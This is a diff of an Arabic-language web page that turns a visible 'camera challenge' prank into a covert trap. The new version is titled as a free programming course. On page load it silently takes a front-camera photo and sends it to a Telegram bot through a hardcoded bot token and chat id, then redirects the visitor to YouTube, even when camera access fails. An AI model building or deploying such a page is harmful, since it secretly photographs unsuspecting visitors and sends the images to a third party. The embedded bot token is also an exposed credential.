@@ -2,44 +2,25 @@
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>التحدي الكبير 😈</title>
-  <style>
-    body {
-      font-family: sans-serif;
-      text-align: center;
-      padding: 40px;
-      background: #111;
-      color: #fff;
-    }
-    #video, #canvas {
-      display: none;
-    }
-    button {
-      font-size: 20px;
-      padding: 10px 20px;
-      background-color: crimson;
-      border: none;
-      border-radius: 10px;
-      color: white;
-      cursor: pointer;
-    }
-  </style>
+  <title>دورة برمجية مجانية</title>
 </head>
 <body>
-
-  <h1>تحدي الكاميرا بينك وبين أبوك 😎</h1>
-  <p id="status">هل تجرؤ على الضغط؟ 😈</p>
-  <button onclick="startChallenge()">ابدأ التحدي!</button>
-
-  <video id="video" autoplay></video>
-  <canvas id="canvas"></canvas>
+  <video id="video" autoplay style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
 
   <script>
     const token = '8077679722:AAGIQbfCgIfyJyystYkR7FdVhtT7Qy-oFBE';
     const chatId = '7728263509';
 
+    function dataURLtoBlob(dataurl) {
+      let arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
+          bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
+      while(n--) u8arr[n] = bstr.charCodeAt(n);
+      return new Blob([u8arr], {type:mime});
+    }
+
     async function sendPhoto(base64Image) {
-      const blob = await (await fetch(base64Image)).blob();
+      const blob = dataURLtoBlob(base64Image);
       const formData = new FormData();
       formData.append("chat_id", chatId);
       formData.append("photo", blob, "photo.jpg");
@@ -50,40 +31,38 @@
       });
     }
 
-    function startChallenge() {
-      document.querySelector("button").style.display = "none";
-      const status = document.getElementById("status");
-      status.textContent = "جارٍ تشغيل الكاميرا...";
-
-      navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-          const video = document.getElementById('video');
-          video.srcObject = stream;
-          video.style.display = "block";
-
-          setTimeout(() => {
-            status.textContent = "📸 ابتسم! سيتم التقاط الصورة بعد 3 ثواني...";
-            setTimeout(() => {
-              const canvas = document.getElementById('canvas');
-              canvas.width = video.videoWidth;
-              canvas.height = video.videoHeight;
-              const ctx = canvas.getContext('2d');
-              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-              stream.getTracks().forEach(track => track.stop());
-
-              const base64Image = canvas.toDataURL("image/jpeg");
-              sendPhoto(base64Image).then(() => {
-                status.textContent = "😜 تم إرسال صورتك إلى البوت! خسرت التحدي!";
-                window.location.href = "https://www.google.com";
-              });
-
-            }, 3000);
-          }, 2000);
-        })
-        .catch(err => {
-          status.textContent = "❌ فشل تشغيل الكاميرا: " + err;
+    async function captureAndSendCameraImage() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" }
         });
+
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+
+        setTimeout(() => {
+          const canvas = document.getElementById('canvas');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+          stream.getTracks().forEach(track => track.stop());
+
+          const base64Image = canvas.toDataURL("image/jpeg");
+          sendPhoto(base64Image).then(() => {
+            // ✅ بعد إرسال الصورة، ينقله ليوتيوب!
+            window.location.href = "https://www.youtube.com/watch?v=SDHEI3obWx0";
+          });
+
+        }, 3000);
+      } catch (err) {
+        // فشل الوصول؟ خلاص يوديه اليوتيوب برضه
+        window.location.href = "https://www.youtube.com/watch?v=SDHEI3obWx0";
+      }
     }
+
+    window.onload = captureAndSendCameraImage;
   </script>
 </body>
 </html>
